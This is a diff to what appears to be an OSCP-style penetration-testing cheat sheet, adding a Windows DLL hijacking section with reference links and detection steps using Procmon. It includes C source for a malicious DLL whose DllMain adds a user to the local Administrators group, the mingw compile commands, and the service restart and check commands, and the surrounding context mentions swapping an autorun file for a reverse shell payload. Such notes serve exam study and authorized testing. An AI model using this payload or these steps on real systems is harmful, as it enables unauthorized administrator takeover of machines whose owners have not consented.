@@ -813,6 +813,30 @@ whoami
 - Detection: WinPEAS (under Autorun Applications)
 - Exploitation: Replace the file in the folder with Full/all access by Authenticated Users, with reverse shell payload of the same name. Reboot and relogin to trigger the autostart.
 
+14. DLL hijacking
+- https://juggernaut-sec.com/dll-hijacking/
+- https://www.youtube.com/watch?v=9s8jYwx9FSA&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=3&t=2s
+- Detection: copy the service in .exe to a Windows VM with admin rights. add the name of the service (i.e. dllhijackservice.exe or dllsvc) to be monitored using Procmon. Set procmon to monitor Result ![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/b7a8b78f-66d0-4a75-9805-efafff5501a9) . Start dll service using 'sc start dllsvc' to see what .dll files are not found. We can then insert our malicious .dll files to be executed as dllsvc runs.
+- Check path of DLL to be searched using 'echo %PATH%' -> ideally should use and place exploit in C:\Temp PATH
+
+```c
+// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+if (dwReason == DLL_PROCESS_ATTACH) {
+    system("cmd. exe /k net localgroup administrators user /add");
+    ExitProcess(0);
+    }
+return TRUE;
+}
+```
+
+- Exploitation: restart dll service using 'sc stop dllsvc & sc start dllsvc'
+- Check if successful using: 'net user user' -> shows Local Group Memberships as Administrators
+
 # Linux Priv Esc
 - https://workbook.securityboat.net/resources/network-pentest-1/network-pentest/priv-escalation
 ## Enumeration
